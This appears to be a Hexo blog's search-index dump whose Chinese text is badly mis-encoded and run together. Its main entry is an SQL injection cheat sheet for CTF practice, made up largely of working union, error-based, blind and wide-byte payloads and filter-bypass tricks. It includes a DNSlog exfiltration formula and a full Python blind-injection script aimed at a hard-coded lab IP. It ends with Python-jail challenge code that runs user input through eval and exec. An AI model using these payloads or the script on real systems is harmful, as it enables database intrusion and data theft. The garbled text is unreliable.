ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šstringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®* updatexmlä½¿ç”¨æ—¶ï¼Œå½“xpath_stringæ ¼å¼å‡ºç°é”™è¯¯ï¼Œmysqlåˆ™ä¼šçˆ†å‡ºxpathè¯­æ³•é”™è¯¯ï¼ˆxpath syntaxï¼‰ mysql&gt; select (updatexml(1,concat(0x7e,(version()),0x7e),1));ERROR 1105 (HY000): XPATH syntax error: â€˜5.5.44-0ubuntu0.14.04.1â€˜ å…¬å¼: updatexml(æ•°å­—,å¸¦æœ‰'~'çš„ä»»ä½•ä¸œè¥¿,æ•°å­—) updatexml(æ•°å­—,(concat(0x7e,(é•¿åº¦ä¸è¿‡63çš„ä»»æ„å­—ç¬¦),0x7e)),æ•°å­—) ## less 18 - Less19 åœ°ç‚¹ä¸ä¸€æ ·ï¼Œæ‡’å¾—å¼„äº†. ## Less20 - Less23 base64ç¼–ç äº†ä¸€ä¸‹ï¼Œè¿˜æ˜¯ä¸€æ · ## Less24 | äºŒæ¬¡æ³¨å…¥","link":"/2022/10/06/sql/"},{"title":"How sfc9982 helped me solve hexo problem","text":"How sfc9982 helped me solve hexo problem I used removeif/hexo-theme-amazing He STFW and RTFM then he solved it. I deeply apperciate his generous assistance.His blog is at googles.plus","link":"/2022/09/29/i-love-hexo/"},{"title":"SQLæ³¨å…¥å¤‡å¿˜å½•","text":"æœ€è¿‘åœ¨ç”¨sql-libå­¦sqlæ³¨å…¥ï¼Œé›¶é›¶æ•£æ•£çš„ç¬”è®°æ•´äº†ä¸€å¤§å †ï¼Œç°åœ¨æ•´åˆä¸€ä¸‹ï¼Œåšä¸ªå¤‡å¿˜å½•ï¼Œæ–¹ä¾¿æ¯”èµ›çš„æ—¶å€™æ–¹ä¾¿æŸ¥è¯¢ã€‚ å…¸ä¸­å…¸ç‰ˆæœ¬:çˆ†åº“ç‰ˆæœ¬: ?id=-1' union select 1,database(),3--+çˆ†åº“: ?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+çˆ†è¡¨: ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='æ•°æ®åº“'#çˆ†å­—æ®µ: ?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='æ•°æ®è¡¨'#è¿™å‡ ä¸ªå‡ºæ¥äº†ï¼Œå‰©ä¸‹çš„å°±ä¸ç”¨æˆ‘è¯´äº†å§qwq å¸¸ç”¨å‡½æ•°: åç§° ä½œç”¨ system_user() ç³»ç»Ÿç”¨æˆ·å user() ç”¨æˆ·å session_user() è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å database() æ•°æ®åº“å version() MYSQLæ•°æ®åº“ç‰ˆæœ¬ load_file() MYSQLè¯»å–æœ¬åœ°æ–‡ä»¶çš„å‡½æ•° @@datadir è¯»å–æ•°æ®åº“è·¯å¾„ @@basedir MYSQL å®‰è£…è·¯å¾„ @@version_compile_os æ“ä½œç³»ç»Ÿ æŠ¥é”™æ³¨å…¥:extractvalueå‡½æ•°éƒ½ä¼šï¼Œä¸è§£é‡Šäº†ã€‚å…¬å¼:extractvalue(æ•°å­—,concat(0x7e,(æŸ¥è¯¢è¯­å¥),0x7e)) updatexmlå‡½æ•°éƒ½ä¼šï¼Œä¸è§£é‡Šäº†ã€‚å…¬å¼:updatexml(æ•°å­—,concat(0x7e,(æŸ¥è¯¢è¯­å¥),0x7e),æ•°å­—) æº¢å‡ºæŠ¥é”™expå‡½æ•°æº¢å‡º | mysql&gt;5.5.53åŸç†:å½“ä¼ é€’ä¸€ä¸ªå¤§äº 709 çš„å€¼æ—¶ï¼Œå‡½æ•° exp() å°±ä¼šå¼•èµ·ä¸€ä¸ªæº¢å‡ºé”™è¯¯,ç”¨ ~ è¿ç®—ç¬¦æŒ‰ä½å–åçš„æ–¹å¼å¾—åˆ°ä¸€ä¸ªæœ€å¤§å€¼ï¼Œè¯¥è¿ç®—ç¬¦ä¹Ÿå¯ä»¥å¤„ç†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç»è¿‡å…¶å¤„ç†çš„å­—ç¬¦ä¸²ä¼šå˜æˆå¤§ä¸€ä¸ªå¾ˆå¤§æ•´æ•°è¶³ä»¥è¶…è¿‡ MySQL çš„ Double æ•°ç»„èŒƒå›´ï¼Œä»è€ŒæŠ¥é”™è¾“å‡ºã€‚ 1234567891011mysql&gt; select ~(select version());+----------------------+| ~(select version()) |+----------------------+| 18446744073709551610 |+----------------------+1 row in set, 1 warning (0.00 sec)mysql&gt; select exp(~(select * from(select version())x));ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '5.5.44-0ubuntu0.14.04.1' from dual)))'mysql&gt; å…¬å¼:select exp(~(select * from(æŸ¥è¯¢è¯­å¥)x));æ”¯æŒload_file,æœ€å¤š13è¡Œ BIGINTæº¢å‡ºå·®ä¸å¤šåŒæ ·çš„åŸç†ï¼Œå¯ä»¥æŠ¥é”™å…¬å¼:select 1+~(select*from(æŸ¥è¯¢è¯­å¥)x);åŒç†ï¼Œå…¶ä»–çš„å‡½æ•°ä¹Ÿå¯ä»¥è¿™ä¹ˆå¹²: 123select !atan((select*from(æŸ¥è¯¢è¯­å¥)a))-~0;select !ceil((select*from(æŸ¥è¯¢è¯­å¥)a))-~0;select !floor((select*from(æŸ¥è¯¢è¯­å¥)a))-~0; å…¶ä»–èƒ½åˆ©ç”¨çš„å‡½æ•°â€¦ 12345678910111213HEXINFLOORCEILRANDCEILINGTRUNCATETANSQRTROUNDSIGNEXP... group by æ³¨å…¥ | è¡¨ä¸­çš„æ•°æ®è‡³å°‘è¦ä¸ºä¸‰æ¡æ‰å¯ä»¥æ³¨å…¥æˆåŠŸåŸç†:group_byæ³¨å…¥ å…¬å¼:select count(*) from information_schema.tables group by concat((æŸ¥è¯¢è¯­å¥),floor(rand()*2));æ•ˆç‡æ¯”è¾ƒä½qwqè€Œä¸”è¿˜æœ‰çŒœé”™çš„å¯èƒ½ æ— selectæ³¨å…¥ | MySQL 8æµ…è°ˆåˆ©ç”¨mysql8æ–°ç‰¹æ€§è¿›è¡ŒSQLæ³¨å…¥è„šæœ¬æ¬åˆ°è¿™é‡Œäº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203'''@author qwzf@desc æœ¬è„šæœ¬æ˜¯ç”¨äºmysql 8æ–°ç‰¹æ€§çš„sqlæ³¨å…¥@date 2021/02/18'''import requestsimport stringurl = 'http://121.41.231.75:8002/Less-8/?id='chars=string.ascii_letters+string.digits+&quot;@{}_-?&quot;def current_db(url): print(&quot;åˆ©ç”¨mysql8æ–°ç‰¹æ€§æˆ–æ™®é€šå¸ƒå°”ç›²æ³¨:\\n1.æ–°ç‰¹æ€§(è”åˆæŸ¥è¯¢) 2.æ™®é€šå¸ƒå°”ç›²æ³¨&quot;) print(&quot;è¯·è¾“å…¥åºå·:&quot;,end='') num = int(input()) if num == 1: payload = &quot;-1' union values row(1,database(),3)--+&quot; #è”åˆæŸ¥è¯¢çˆ†å½“å‰æ•°æ®åº“(å¯ä¿®æ”¹) urls = url + payload r = requests.get(url=urls) print(r.text) else: name='' payload = &quot;1' and ascii(substr((database()),{0},1))={1}--+&quot; #å¸ƒå°”ç›²æ³¨çˆ†å½“å‰æ•°æ®åº“(å¯ä¿®æ”¹) for i in range(1,40): char='' for j in chars: payloads = payload.format(i,ord(j)) urls = url + payloads r = requests.get(url=urls) if &quot;You are in&quot; in r.text: name += j print(name) char = j break if char == '': breakdef str2hex(name): res = '' for i in name: res += hex(ord(i)) res = '0x' + res.replace('0x','') return resdef dbs(url): #æ— åˆ—åç›²æ³¨çˆ†æ‰€æœ‰æ•°æ®åº“(å¯ä¿®æ”¹) while True: print(&quot;è¯·è¾“å…¥è¦çˆ†ç¬¬å‡ ä¸ªæ•°æ®åº“ï¼Œå¦‚ï¼š1,2ç­‰:&quot;,end='') x = int(input())-1 num = str(x) if x &lt; 0: break payload = &quot;1' and ('def',{},'',4,5,6)&gt;(table information_schema.schemata limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakdef tables_n(url,database): #æ— åˆ—åç›²æ³¨çˆ†æ•°æ®è¡¨å¼€å§‹è¡Œæ•°(å¯ä¿®æ”¹) payload = &quot;1' and ('def','&quot;+database+&quot;','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit {},1)--+&quot; for i in range(0,10000): payloads = payload.format(i) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: char = chr(ord(database[-1])+1) database = database[0:-1]+char payld = &quot;1' and ('def','&quot;+database+&quot;','','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit &quot;+str(i)+&quot;,1)--+&quot; urls = url + payld res = requests.get(url=urls) #print(i) if 'You are in' not in res.text: print('ä»ç¬¬',i,'è¡Œå¼€å§‹çˆ†æ•°æ®è¡¨') #åˆ¤æ–­å¼€å§‹è¡Œæ•° n = i break return ndef tables(url,database,n): #æ— åˆ—åç›²æ³¨çˆ†æ•°æ®è¡¨(å¯ä¿®æ”¹) while True: print(&quot;è¯·è¾“å…¥è¦çˆ†ç¬¬å‡ ä¸ªæ•°æ®è¡¨ï¼Œå¦‚ï¼š1,2ç­‰:&quot;,end='') x = int(input())-1 num = str(x + n) if x &lt; 0: break payload = &quot;1' and ('def','&quot;+database+&quot;',{},'',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&gt;(table information_schema.tables limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakdef columns_n(url,database,table): #æ— åˆ—åç›²æ³¨çˆ†å­—æ®µå¼€å§‹è¡Œæ•°(å¯ä¿®æ”¹) payload = &quot;1' and ('def','&quot;+database+&quot;','&quot;+table+&quot;','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit {},1)--+&quot; for i in range(3000,10000): payloads = payload.format(i) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: char = chr(ord(table[-1])+1) table = table[0:-1]+char payld = &quot;1' and ('def','&quot;+database+&quot;','&quot;+table+&quot;','',5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit &quot;+str(i)+&quot;,1)--+&quot; urls = url + payld res = requests.get(url=urls) #print(i) if 'You are in' not in res.text: print('ä»ç¬¬',i,'è¡Œå¼€å§‹çˆ†å­—æ®µ') #åˆ¤æ–­å¼€å§‹è¡Œæ•° n = i break return ndef columns(url,database,table,n): #æ— åˆ—åç›²æ³¨çˆ†å­—æ®µå€¼(å¯ä¿®æ”¹) while True: print(&quot;è¯·è¾“å…¥è¦çˆ†ç¬¬å‡ ä¸ªå­—æ®µï¼Œå¦‚ï¼š1,2ç­‰:&quot;,end='') x = int(input())-1 num = str(x + n) if x &lt; 0: break payload = &quot;1' and ('def','&quot;+database+&quot;','&quot;+table+&quot;',{},'',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&gt;(table information_schema.columns limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakdef datas(url,table): #æ— åˆ—åç›²æ³¨çˆ†æ•°æ®(å¯ä¿®æ”¹) while True: print(&quot;è¯·è¾“å…¥è¦çˆ†ç¬¬å‡ ä¸ªæ•°æ®ï¼Œå¦‚ï¼š1,2ç­‰:&quot;,end='') x = int(input()) y = x-1 num = str(y) if y &lt; 0: break payload = &quot;1' and (&quot;+str(x)+&quot;,{},'')&gt;(table &quot;+table+&quot; limit &quot;+num+&quot;,1)--+&quot; name = '' for i in range(1,20): hexchar = '' for char in range(32, 126): hexchar = str2hex(name + chr(char)) payloads = payload.format(hexchar) #print(payloads) urls = url + payloads r = requests.get(url=urls) if 'You are in' in r.text: name += chr(char-1) print(name) breakif __name__ == &quot;__main__&quot;: while True: print(&quot;è¯·è¾“å…¥è¦æ“ä½œçš„å†…å®¹ï¼š\\n1.çˆ†å½“å‰æ•°æ®åº“\\n2.çˆ†æ•°æ®è¡¨å¼€å§‹è¡Œå·\\n3.çˆ†æ•°æ®è¡¨\\n4.çˆ†å­—æ®µå€¼å¼€å§‹è¡Œå·\\n5.çˆ†å­—æ®µå€¼\\n6.çˆ†æ•°æ®\\n7.çˆ†æ‰€æœ‰æ•°æ®åº“&quot;) types = int(input()) if types == 1: current_db(url) elif types == 2 or types == 3: print(&quot;è¯·è¾“å…¥å·²ç»å¾—åˆ°çš„æ•°æ®åº“å:&quot;,end='') database = input() if types == 2: tables_n(url,database) elif types == 3: print(&quot;çˆ†æ•°æ®è¡¨å¼€å§‹è¡Œå·:&quot;,end='') n = int(input()) tables(url,database,n) elif types == 4 or types == 5: print(&quot;è¯·è¾“å…¥å·²ç»å¾—åˆ°çš„æ•°æ®åº“å:&quot;,end='') database = input() print(&quot;è¯·è¾“å…¥å·²ç»å¾—åˆ°çš„æ•°æ®è¡¨å:&quot;,end='') table = input() if types == 4: columns_n(url,database,table) elif types == 5: print(&quot;çˆ†å­—æ®µå€¼å¼€å§‹è¡Œå·:&quot;,end='') n = int(input()) columns(url,database,table,n) elif types == 6: print(&quot;è¯·è¾“å…¥è¦æŸ¥è¯¢çš„æ•°æ®è¡¨å:&quot;,end='') table = input() datas(url,table) else: dbs(url) æ—¶é—´ç›²æ³¨åŸç†éƒ½ä¼šï¼Œä¸è®²äº†ã€‚ asciiåˆ¤æ–­:if(ascii(substr(æŸ¥è¯¢è¯­å¥,1,1))&gt;115,1,sleep(3))leftè¯­å¥åˆ¤æ–­:if(left(æŸ¥è¯¢è¯­å¥,1)='s',sleep(10),1) if(left(æŸ¥è¯¢è¯­å¥,2)='sa',sleep(10),1)substringå‡½æ•°åˆ¤æ–­:if(substring((æŸ¥è¯¢è¯­å¥),1,1='a'),11111,sleep(1)) å¸ƒå°”æ³¨å…¥åŒæ—¶é—´ç›²æ³¨ï¼Œæ²¡å•¥ä¸œè¥¿ äºŒæ¬¡æ³¨å…¥ä¹Ÿæ²¡å•¥å¤ªå¤šæ´»èƒ½æ•´ï¼Œå¯ä»¥ä½¿ç”¨flaskæ¡†æ¶æœ¬åœ°ä¸­è½¬ä¸€ä¸‹ï¼ŒæŠŠç¹ççš„æ­¥éª¤äº¤ç»™æœºå™¨åšã€‚ å †å æ³¨å…¥èƒ½åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥ï¼Œè¦æ±‚æ¯”è¾ƒé«˜ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨é¢„ç¼–è¯‘äº†ã€‚å¯ä»¥å‚è€ƒè¿™é¢˜æ•´èŠ±æ´»**[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨**BUUCTF[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ çš„ä¸‰ç§è§£æ³• Dnslogæ³¨å…¥è¦æ±‚mysqlæƒé™æ¯”è¾ƒé«˜ï¼ŒåŒæ—¶è¿˜å¾—èƒ½å‡ºç½‘å…¬å¼:select load_file(concat('\\\\',(æŸ¥è¯¢è¯­å¥),'.DNSLOGç»™çš„åŸŸå/ä»»æ„å­—ç¬¦' æœç´¢æ³¨å…¥åŸç†:mysqlæŸ¥è¯¢çš„æ—¶å€™ï¼Œå¸¸ç”¨çš„æ˜¯select * from sqltest where names like '%è¦æŸ¥è¯¢çš„å…³é”®å­—%è¿™æ—¶å€™å°±å¯ä»¥é—­åˆ%ç„¶åæ³¨å…¥ å®½å­—èŠ‚æ³¨å…¥ |ä½¿ç”¨äº†addslashes()å‡½æ•° &amp;&amp; æ•°æ®åº“è®¾ç½®äº†ç¼–ç æ¨¡å¼ä¸ºGBKåŸç†: å‰ç«¯è¾“å…¥%dfæ—¶ï¼Œé¦–å…ˆç»è¿‡addslashes()è½¬ä¹‰å˜æˆ%df%5c%27ï¼Œä¹‹åï¼Œåœ¨æ•°æ®åº“æŸ¥è¯¢å‰ï¼Œå› ä¸ºè®¾ç½®äº†GBKç¼–ç ï¼ŒGBKç¼–ç åœ¨æ±‰å­—ç¼–ç èŒƒå›´å†…çš„ä¸¤ä¸ªå­—èŠ‚éƒ½ä¼šé‡æ–°ç¼–ç æˆä¸€ä¸ªæ±‰å­—ã€‚ç„¶åmysqlæœåŠ¡å™¨ä¼šå¯¹æŸ¥è¯¢çš„è¯­å¥è¿›è¡ŒGBKç¼–ç ï¼Œ%df%5cç¼–ç æˆäº†â€œè¿â€ï¼Œè€Œå•å¼•å·é€ƒé€¸äº†å‡ºæ¥ï¼Œå½¢æˆäº†æ³¨å…¥æ¼æ´ã€‚ 12345?id=%df' and 1=1 --+?id=%df' and 1=2 --+?id=-1%df' union select 1,2,3 %23 limitæ³¨å…¥ | æ•°æ®åº“ç‰ˆæœ¬æ¯”è¾ƒä½åŸç†:Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³•å…¬å¼:SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,æŸ¥è¯¢è¯­å¥)),1); Bypassç©ºæ ¼ä¸¤ä¸ªç©ºæ ¼ä»£æ›¿ä¸€ä¸ªç©ºæ ¼ï¼Œç”¨Tabä»£æ›¿ç©ºæ ¼ï¼Œ%a0=ç©ºæ ¼,æ‹¬å·ä»£æ›¿ç©ºæ ¼,æ³¨é‡Š/*æ³¨é‡Š*/ å¼•å· | åå…­è¿›åˆ¶è¿™ä¸ªæ—¶å€™å¦‚æœå¼•å·è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆä¸Šé¢çš„whereå­å¥å°±æ— æ³•ä½¿ç”¨äº†ã€‚é‚£ä¹ˆé‡åˆ°è¿™æ ·çš„é—®é¢˜å°±è¦ä½¿ç”¨åå…­è¿›åˆ¶æ¥å¤„ç†è¿™ä¸ªé—®é¢˜äº†ã€‚usersçš„åå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²æ˜¯7573657273ã€‚é‚£ä¹ˆæœ€åçš„sqlè¯­å¥å°±å˜ä¸ºäº†ï¼š select column_name from information_schema.tables where table_name=0x7573657273 é€—å·åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œéœ€è¦ä½¿ç”¨åˆ°substr(),mid(),limitã€‚è¿™äº›å­å¥æ–¹æ³•éƒ½éœ€è¦ä½¿ç”¨åˆ°é€—å·ã€‚å¯¹äºsubstr()å’Œmid()è¿™ä¸¤ä¸ªæ–¹æ³•å¯ä»¥ä½¿ç”¨from toçš„æ–¹å¼æ¥è§£å†³ï¼š select substr(database() from 1 for 1); select mid(database() from 1 for 1); ä½¿ç”¨joinï¼š union select 1,2# ç­‰ä»·äº union select * from (select 1)a join (select 2)b ä½¿ç”¨like: select ascii(mid(user(),1,1))=80 # ç­‰ä»·äº select user() like 'r%' å¯¹äºlimitå¯ä»¥ä½¿ç”¨offsetæ¥ç»•è¿‡ï¼š select * from news limit 0,1 # ç­‰ä»·äºä¸‹é¢è¿™æ¡SQLè¯­å¥ select * from news limit 1 offset 0 ç»•è¿‡æ¯”è¾ƒç¬¦å·()ï¼ˆè¿‡æ»¤äº†&lt;&gt;ï¼šsqlmapç›²æ³¨ç»å¸¸ä½¿ç”¨&lt;&gt;ï¼Œä½¿ç”¨betweençš„è„šæœ¬ï¼‰ï¼š ä½¿ç”¨greatest()ã€leastï¼ˆï¼‰ï¼šï¼ˆå‰è€…è¿”å›æœ€å¤§å€¼ï¼Œåè€…è¿”å›æœ€å°å€¼ï¼‰ åŒæ ·æ˜¯åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œåœ¨ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾çš„æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°æ¯”è¾ƒæ“ä½œç¬¦æ¥è¿›è¡ŒæŸ¥æ‰¾ã€‚å¦‚æœæ— æ³•ä½¿ç”¨æ¯”è¾ƒæ“ä½œç¬¦ï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åˆ°greatestæ¥è¿›è¡Œç»•è¿‡äº†ã€‚ æœ€å¸¸è§çš„ä¸€ä¸ªç›²æ³¨çš„sqlè¯­å¥ï¼š select * from users where id=1 and ascii(substr(database(),0,1))&gt;64 æ­¤æ—¶å¦‚æœæ¯”è¾ƒæ“ä½œç¬¦è¢«è¿‡æ»¤ï¼Œä¸Šé¢çš„ç›²æ³¨è¯­å¥åˆ™æ— æ³•ä½¿ç”¨,é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨greatestæ¥ä»£æ›¿æ¯”è¾ƒæ“ä½œç¬¦äº†ã€‚greatest(n1,n2,n3,â€¦)å‡½æ•°è¿”å›è¾“å…¥å‚æ•°(n1,n2,n3,â€¦)çš„æœ€å¤§å€¼ã€‚ é‚£ä¹ˆä¸Šé¢çš„è¿™æ¡sqlè¯­å¥å¯ä»¥ä½¿ç”¨greatestå˜ä¸ºå¦‚ä¸‹çš„å­å¥: select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64 Betweenæ³¨å…¥ä¸»è¦ç”¨äºç›²æ³¨çœ‹é¡µé¢æ˜¯å¦æœ‰å˜åŒ–ï¼ŒåŸç†å¦‚ä¸‹ï¼Œä¾‹å¦‚usernameçš„å­—ç¬¦å†…å®¹æ˜¯test1ï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯tï¼Œaåˆ°bæœç´¢ä¸äº†ï¼Œé¡µé¢ä¸æ­£å¸¸ã€‚ aåˆ°tå°±æœ‰äº†ï¼Œé¡µé¢æ­£å¸¸ æ³¨between 1 and 1; ç­‰ä»·äº =1 WHEREå¯ä»¥ä½¿ç”¨having ,ä½†æ˜¯havingåªèƒ½ç”¨å‰é¢selectå·²ç»é€‰æ‹©çš„åˆ—å 12select goods_price,goods_name from sw_goods where goods_price &gt; 100select goods_price,goods_name from sw_goods having goods_price &gt; 100 è¿‡æ»¤information_schemaå¯ä»¥æŸ¥è¡¨å: InnoDbå¼•æ“ä»MYSQL5.5.8å¼€å§‹ï¼ŒInnoDBæˆä¸ºå…¶é»˜è®¤å­˜å‚¨å¼•æ“ã€‚è€Œåœ¨MYSQL5.6ä»¥ä¸Šçš„ç‰ˆæœ¬ä¸­ï¼Œinndbå¢åŠ äº†innodb_index_statså’Œinnodb_table_statsä¸¤å¼ è¡¨ï¼Œè¿™ä¸¤å¼ è¡¨ä¸­éƒ½å­˜å‚¨äº†æ•°æ®åº“å’Œå…¶æ•°æ®è¡¨çš„ä¿¡æ¯ï¼Œä½†æ˜¯æ²¡æœ‰å­˜å‚¨åˆ—åã€‚åªéœ€è¦æŠŠinfromation_schemaæ¢æˆmysql.innodb_table_stats sysæ•°æ®åº“åœ¨5.7ä»¥ä¸Šçš„MYSQLä¸­ï¼Œæ–°å¢äº†sysæ•°æ®åº“ï¼Œè¯¥åº“çš„åŸºç¡€æ•°æ®æ¥è‡ªinformation_schemaå’Œperformance_chemaï¼Œå…¶æœ¬èº«ä¸å­˜å‚¨æ•°æ®ã€‚å¯ä»¥é€šè¿‡å…¶ä¸­çš„schema_auto_increment_columnsæ¥è·å–è¡¨åã€‚åªéœ€è¦æŠŠinformation_schemaæ¢æˆsys.schema_auto_increment_columnså°±è¡Œäº†ï¼Œå…¶ä»–çš„å®Œå…¨ä¸€æ · ä¹‹åå°±éœ€è¦æ— åˆ—åæ³¨å…¥äº† SLEEPç¡ä¸äº†ï¼Ÿå°±æƒ³åŠæ³•è®©sqlå¹²é‡æ´»æ…¢ä¸‹æ¥concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b' or and xor notç»•è¿‡ï¼šand=&amp;&amp; or=|| xor=| not=! ç»•è¿‡æ³¨é‡Šç¬¦ï¼ˆ#ï¼Œâ€“(åé¢è·Ÿä¸€ä¸ªç©ºæ ¼ï¼‰ï¼‰è¿‡æ»¤ï¼š id=1' union select 1,2,3||'1 æœ€åçš„or â€˜1é—­åˆæŸ¥è¯¢è¯­å¥çš„æœ€åçš„å•å¼•å·ï¼Œæˆ–è€…ï¼š id=1' union select 1,2,'3 ç»•è¿‡ç­‰äºå·ä½¿ç”¨like ã€rlike ã€regexp æˆ–è€… ä½¿ç”¨&lt; æˆ–è€… &gt; å…¶ä»–çš„bypassæ‰‹æ®µ:è¿™ä¸ªå°±çœ‹é¢˜ç›®ç¯å¢ƒäº†ï¼Œé¢˜ç›®é‡Œéšæœºå¤šæ ·ï¼Œä½†æ˜¯ä¸‡å˜ä¸ç¦»å…¶å®—ã€‚ Sqlmapç§‘æŠ€æœªå®Œå¾…ç»­ ç›¸å…³é“¾æ¥:Sqlié€šå…³flaskæ¡†æ¶expå‡½æ•°æº¢å‡ºæ³¨å…¥MySQLæ³¨å…¥æŒ‡åŒ—group_byæ³¨å…¥group_byæŠ¥é”™æ³¨å…¥BIGINTæŠ¥é”™æ³¨å…¥SQLæ³¨å…¥å…³è”åˆ†ææµ…è°ˆåˆ©ç”¨mysql8æ–°ç‰¹æ€§è¿›è¡ŒSQLæ³¨å…¥SQLæ³¨å…¥ä¹‹æ— åˆ—åæ³¨å…¥","link":"/2022/10/15/sql%E5%A4%87%E5%BF%98%E5%BD%95/"},{"title":"","text":"[Week1]calc_jail_beginner_level2.5(JAIL)12345678910111213141516171819202122232425262728293031323334353637#the length is be limited less than 13#it seems banned some payload #banned some unintend sol#Can u escape it?Good luck!def filter(s): BLACKLIST = [&quot;exec&quot;,&quot;input&quot;,&quot;eval&quot;] for i in BLACKLIST: if i in s: print(f'{i!r} has been banned for security reasons') exit(0)WELCOME = ''' _ _ _ _ _ _ _ ___ _____ | | (_) (_) (_) | | | |__ \\ | ____| | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | _____ _____| | ) | | |__ | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | |/ _ \\ \\ / / _ \\ | / / |___ \\ | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | __/\\ V / __/ |/ /_ _ ___) | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_|_|\\___| \\_/ \\___|_|____(_)____/ __/ | _/ | |___/ |__/ '''print(WELCOME)print(&quot;Welcome to the python jail&quot;)print(&quot;Let's have an beginner jail of calc&quot;)print(&quot;Enter your expression and I will evaluate it for you.&quot;)input_data = input(&quot;&gt; &quot;)filter(input_data)if len(input_data)&gt;13: print(&quot;Oh hacker!&quot;) exit(0)print('Answer: {}'.format(eval(input_data))) Unicode æ¬ºéª—https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E6%9E%81%E7%AB%AF%E9%99%90%E5%88%B6å¥½æ£’çš„åšå®¢ [WEEK2]calc_jail_beginner_level5(JAIL)1#It\\'s an challenge for jaillevel5 let\\'s read your flag!\\nimport load_flag\\n\\nflag = load_flag.get_flag()\\n\\ndef main():\\n WELCOME = \\'\\'\\'\\n _ _ _ _ _ _ _ _____ \\n | | (_) (_) (_) | | | | ____|\\n | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | _____ _____| | |__ \\n | \\'_ \\\\ / _ \\\\/ _` | | \\'_ \\\\| \\'_ \\\\ / _ \\\\ \\'__| | |/ _` | | | |/ _ \\\\ \\\\ / / _ \\\\ |___ \\\\ \\n | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | __/\\\\ V / __/ |___) |\\n |_.__/ \\\\___|\\\\__, |_|_| |_|_| |_|\\\\___|_| | |\\\\__,_|_|_|_|\\\\___| \\\\_/ \\\\___|_|____/ \\n __/ | _/ | \\n |___/ |__/ \\n\\'\\'\\'\\n print(WELCOME)\\n print(&quot;It\\'s so easy challenge!&quot;)\\n print(&quot;Seems flag into the dir()&quot;)\\n repl()\\n\\n\\ndef repl():\\n my_global_dict = dict()\\n my_global_dict[\\'my_flag\\'] = flag\\n input_code = input(&quot;&gt; &quot;)\\n complie_code = compile(input_code, \\'&lt;string&gt;\\', \\'single\\')\\n exec(complie_code, my_global_dict)\\n\\nif __name__ == \\'__main__\\':\\n 